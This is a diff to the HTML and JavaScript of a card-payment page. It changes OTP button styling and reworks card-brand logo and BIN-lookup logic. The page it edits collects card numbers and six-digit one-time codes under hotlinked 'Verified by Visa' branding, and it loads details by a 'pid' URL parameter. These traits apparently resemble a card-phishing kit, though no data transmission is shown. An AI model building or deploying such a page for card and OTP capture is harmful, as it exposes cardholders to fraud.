@@ -184,20 +184,22 @@
       -webkit-text-security: disc;
       caret-color: transparent;
     }
-    /* OTP Button: Same size and rounded as the OTP input */
+    /* OTP Button styled to match OTP input */
     .otp-button {
       width: 100%;
       padding: 10px;
       border: 1px solid #ccc;
       border-radius: 5px;
+      text-align: center;
+      font-size: 18px;
       background-color: #3b82f6;
       color: white;
-      font-size: 18px;
-      text-align: center;
+      cursor: pointer;
       transition: background-color 0.3s ease;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    }
+    .otp-button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
     }
     /* ========= Animations ========= */
     .animate-slide-in { animation: slideIn 0.3s ease-out; }
@@ -400,7 +402,6 @@
                   <input type="password" id="otp" maxlength="6" class="otp-input w-full px-3 py-2 border border-gray-300 text-center text-lg tracking-wider rounded-md" placeholder="••••••" required>
                 </div>
                 <div class="otp-button-wrapper">
-                  <!-- OTP Confirm Button styled to match OTP input -->
                   <button type="button" id="otpSubmitButton" class="otp-button" disabled>
                     <span id="otpText">Confirm</span>
                     <div id="otpLoader" class="w-5 h-5 animate-spin hidden ml-2">
@@ -436,9 +437,8 @@
       <img src="https://usa.visa.com/dam/VCOM/regional/ve/romania/blogs/hero-image/visa-logo-800x450.jpg" alt="Verified by Visa" class="h-6" />
     </div>
   </div>
-  <!-- Payment Details & Card Validation Scripts -->
+  <!-- Global Variables -->
   <script>
-    // Global Variables
     let isCardValid = false;
     let isExpiryValid = false;
     let isProcessing = false;
@@ -448,8 +448,8 @@
     let timer = 180;
     let consentChecked = true;
   </script>
+  <!-- Fetch Payment Details Using PID with Fallback -->
   <script>
-    // Fetch Payment Details Using PID with Fallback
     document.addEventListener('DOMContentLoaded', async () => {
       const urlParams = new URLSearchParams(window.location.search);
       let pid = urlParams.get('pid');
@@ -486,8 +486,8 @@
       }
     });
   </script>
+  <!-- Card Formatting, BIN Lookup, and Expiry Validation -->
   <script>
-    // Card Formatting, BIN Lookup, and Expiry Validation
     function validateCard(number) {
       let arr = number.replace(/\D/g, '').split('').reverse().map(x => parseInt(x, 10));
       let sum = 0;
@@ -566,12 +566,8 @@
       const cardIcon = document.getElementById("cardTypeIcon");
       const cardInfo = document.getElementById("cardInfo");
       const plain = value.replace(/\s/g, '');
-      if (plain.length === 0) {
-        cardIcon.innerHTML = "";
-        if (cardInfo) cardInfo.textContent = "";
-        return;
-      }
-      if (plain.length < 6) {
+      // Always show card logo if any digits entered
+      if (plain.length > 0 && plain.length < 6) {
         let type = detectCardType(plain);
         let logoUrl = "";
         switch (type) {
@@ -592,11 +588,11 @@
         }
         cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
         if (cardInfo) cardInfo.textContent = "";
-      } else {
+      } else if (plain.length >= 6) {
         const bin = plain.slice(0, 6);
         const binData = await lookupBIN(bin);
+        let logoUrl = "";
         if (binData) {
-          let logoUrl = "";
           switch ((binData.scheme || "").toLowerCase()) {
             case "visa":
               logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
@@ -633,8 +629,8 @@
             }
           }
         } else {
+          // Fallback: use basic detection
           let type = detectCardType(plain);
-          let logoUrl = "";
           switch (type) {
             case "visa":
               logoUrl = "https://raw.githubusercontent.com/danielcharrua/payment-icons/master/assets/visa/visa-curved-128px.png";
@@ -654,6 +650,9 @@
           cardIcon.innerHTML = logoUrl ? `<img src="${logoUrl}" alt="${type}" style="max-height:100%; max-width:100%;">` : "";
           if (cardInfo) cardInfo.textContent = "";
         }
+      } else {
+        cardIcon.innerHTML = "";
+        if (cardInfo) cardInfo.textContent = "";
       }
     }
     function updateSubmitButton() {
@@ -676,12 +675,11 @@
       const otpButton = document.getElementById('otpSubmitButton');
       if (otp.length === 6) {
         otpButton.disabled = false;
-        // Set the button's class to match the OTP input exactly
         otpButton.className = "otp-button";
         document.getElementById('otpError').style.display = 'none';
       } else {
         otpButton.disabled = true;
-        otpButton.className = "otp-button"; // same styling but disabled state
+        otpButton.className = "otp-button";
       }
     }
     document.addEventListener("DOMContentLoaded", function(){
